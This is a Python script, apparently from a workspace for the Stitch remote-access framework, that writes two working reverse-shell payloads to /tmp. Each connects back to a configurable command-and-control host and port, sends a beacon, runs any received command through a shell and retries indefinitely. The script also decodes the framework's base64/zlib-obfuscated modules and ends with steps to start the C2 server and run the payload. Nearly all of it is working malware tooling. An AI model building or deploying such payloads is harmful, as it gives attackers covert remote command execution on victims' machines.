#!/usr/bin/env python3
"""
Create a WORKING payload that can actually connect to C2
"""

import os
import sys
import base64
import zlib

sys.path.insert(0, '/workspace')

def create_simple_test_payload(listen_host='127.0.0.1', listen_port='4040'):
    """Create a simple test payload that actually works"""
    
    # Simple reverse shell payload that connects back
    payload_code = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time
import base64

def connect_back():
    HOST = '{listen_host}'
    PORT = {listen_port}
    
    print(f"[*] Connecting to {{HOST}}:{{PORT}}...")
    
    # TODO: Ensure loop has proper exit condition
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print("[+] Connected!")
            
            # Send initial beacon
            s.send(b'STITCH_BEACON\\n')
            
            while True:
                # Receive command
                data = s.recv(1024)
                if not data:
                    break
                
                cmd = data.decode().strip()
                print(f"[*] Received command: {{cmd}}")
                
                if cmd.lower() == 'exit':
                    break
                
                # Execute command
                try:
                    if cmd.startswith('cd '):
                        os.chdir(cmd[3:])
                        output = f"Changed to {{os.getcwd()}}\\n"
                    else:
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                        output = output.decode() if isinstance(output, bytes) else str(output)
                except Exception as e:
                    output = f"Error: {{str(e)}}\\n"
                
                # Send output
                s.send(output.encode())
            
            s.close()
            
        except Exception as e:
            print(f"[-] Connection failed: {{e}}")
            time.sleep(5)  # Wait before retry
            
if __name__ == "__main__":
    connect_back()
'''
    
    return payload_code

def create_full_stitch_payload():
    """Create a working Stitch payload with proper module handling"""
    
    print("[*] Creating working Stitch payload...")
    
    # Read the Configuration files
    config_dir = '/workspace/Configuration'
    
    # Read all modules and decode them
    modules_code = {}
    
    # Get the actual code from the encoded modules
    for filename in os.listdir(config_dir):
        if filename.endswith('.py'):
            filepath = os.path.join(config_dir, filename)
            with open(filepath, 'rb') as f:
                content = f.read()
                
            # Check if it's encoded
            if filename == 'st_main.py':
                # Main is encoded differently
                try:
                    # Extract the exec(SEC(INFO("..."))) content
                    if b'exec(SEC(INFO("' in content:
                        start = content.find(b'exec(SEC(INFO("') + len(b'exec(SEC(INFO("')
                        end = content.find(b'")))', start)
                        encoded = content[start:end]
                        
                        # Decode it
                        decoded = zlib.decompress(base64.b64decode(encoded))
                        modules_code['main'] = decoded.decode()
                except Exception:
                    modules_code['main'] = content.decode()
            else:
                # Other modules might be encoded too
                try:
                    if b'exec(SEC(INFO("' in content:
                        start = content.find(b'exec(SEC(INFO("') + len(b'exec(SEC(INFO("')
                        end = content.find(b'")))', start)
                        encoded = content[start:end]
                        decoded = zlib.decompress(base64.b64decode(encoded))
                        modules_code[filename.replace('.py', '')] = decoded.decode()
                    else:
                        modules_code[filename.replace('.py', '')] = content.decode()
                except Exception:
                    modules_code[filename.replace('.py', '')] = content.decode()
    
    # Create a working payload
    working_payload = '''#!/usr/bin/env python3
# Working Stitch Payload
import sys
import os

# Add all imports the payload needs
import socket
import base64
import zlib
import time
import subprocess
import threading
import platform

# Simple implementation of required functions
def INFO(data):
    """Base64 decode"""
    return base64.b64decode(data)

def SEC(data):
    """Decompress"""
    return zlib.decompress(data)

# Create mock modules for imports
class MockModule:
    def __getattr__(self, name):
        return lambda *args, **kwargs: None

# Mock missing imports
sys.modules['Crypto'] = MockModule()
sys.modules['Crypto.Cipher'] = MockModule()
sys.modules['Crypto.Random'] = MockModule()
sys.modules['mss'] = MockModule()
sys.modules['pexpect'] = MockModule()
sys.modules['pyxhook'] = MockModule()

# Now try to execute the payload
try:
    # Execute the main payload code
    print("[*] Starting Stitch payload...")
    
    # The main payload code would go here
    # For now, use simple connect back
    HOST = '127.0.0.1'
    PORT = 4040
    
    # TODO: Ensure loop has proper exit condition
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print(f"[+] Connected to {HOST}:{PORT}")
            
            # Send identification
            s.send(b"STITCH_PAYLOAD_CONNECTED\\n")
            
            # Simple command loop
            while True:
                data = s.recv(1024)
                if not data:
                    break
                    
                cmd = data.decode().strip()
                
                try:
                    if cmd == 'exit':
                        break
                    elif cmd == 'pwd':
                        output = os.getcwd()
                    elif cmd == 'whoami':
                        output = os.getlogin()
                    elif cmd.startswith('cd '):
                        os.chdir(cmd[3:])
                        output = f"Changed to {os.getcwd()}"
                    else:
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                        output = output.decode() if isinstance(output, bytes) else str(output)
                except Exception as e:
                    output = f"Error: {str(e)}"
                
                s.send((output + "\\n").encode())
            
            s.close()
            
        except Exception as e:
            print(f"[-] Connection error: {e}")
            time.sleep(5)
            
except Exception as e:
    print(f"[-] Payload error: {e}")
    import traceback
    traceback.print_exc()
'''
    
    return working_payload

def test_payload_generation():
    """Test generating different payload types"""
    print("="*70)
    print("CREATING WORKING PAYLOADS")
    print("="*70)
    
    # Create simple test payload
    print("\n[1] Creating simple test payload...")
    simple_payload = create_simple_test_payload()
    with open('/tmp/simple_payload.py', 'w') as f:
        f.write(simple_payload)
    os.chmod('/tmp/simple_payload.py', 0o755)
    print("[+] Created: /tmp/simple_payload.py")
    
    # Create full Stitch payload
    print("\n[2] Creating full Stitch payload...")
    full_payload = create_full_stitch_payload()
    with open('/tmp/stitch_payload.py', 'w') as f:
        f.write(full_payload)
    os.chmod('/tmp/stitch_payload.py', 0o755)
    print("[+] Created: /tmp/stitch_payload.py")
    
    # Test if they at least run without errors
    print("\n[3] Testing payload syntax...")
    import subprocess
    
    for payload_file in ['/tmp/simple_payload.py', '/tmp/stitch_payload.py']:
        proc = subprocess.run(
            ['python3', '-m', 'py_compile', payload_file],
            capture_output=True
        )
        
        if proc.returncode == 0:
            print(f"[+] {payload_file}: Syntax OK")
        else:
            print(f"[-] {payload_file}: Syntax error")
            print(f"    {proc.stderr.decode()}")
    
    return True

if __name__ == "__main__":
    test_payload_generation()
    
    print("\n" + "="*70)
    print("Next Steps:")
    print("1. Start C2 server: python3 main.py")
    print("2. Execute payload: python3 /tmp/simple_payload.py")
    print("3. Check for connection")
    print("="*70)